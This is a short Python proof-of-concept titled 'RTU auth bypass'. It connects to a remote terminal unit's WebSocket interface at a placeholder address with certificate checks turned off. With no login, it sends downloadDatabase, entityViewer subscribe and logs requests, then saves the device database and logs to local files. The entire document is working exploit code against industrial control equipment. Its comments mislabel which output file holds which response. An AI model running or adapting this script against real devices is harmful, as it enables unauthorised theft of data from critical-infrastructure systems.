# RTU auth bypass
import websocket
import ssl
import json

index = 1 # Counter for generating filenames

def send_and_receive(message):
    global index
    # WebSocket URL
    websocket_url = "wss://10.10.10.10:8443"    #change this

    # Create a WebSocket connection
    ws = websocket.WebSocket(sslopt={"cert_reqs": ssl.CERT_NONE})
    ws.connect(websocket_url)

    try:
        # Send the message
        ws.send(json.dumps(message))
        print(f"Sent: {json.dumps(message)}")

        # Receive the response
        response = ws.recv()
        print("Received response")

        # if the received message is for the downloadDB request, convert the bytes and save in out.sql        
        if 'contentBytes' in response:
            response_data = json.loads(response)
            content_bytes = response_data['data']['contentBytes']
            with open('out.sql', 'wb') as file_sql:
                file_sql.write(bytes(content_bytes))

        save_response_to_file(index, response)
        index=index+1

    finally:
        # Close the WebSocket connection
        ws.close()

def save_response_to_file(filename, response):
    filename = str(filename) + '.json'
    with open(filename, 'w') as file:
        file.write(response)
    print(f"Saved response to {filename}")


# Message to send
messages_to_send = [
    {"type":"downloadDatabase"},                    #download DB, will be saved in 1.json
    {"type":"subscribe","topic":"entityViewer"},    #entityViewer, will be saved in 2.json AND out.sql
    {"type":"logs"}                                 #download all logs, will be saved in 3.json
]

# Send and receive
for message in messages_to_send:
    send_and_receive(message)
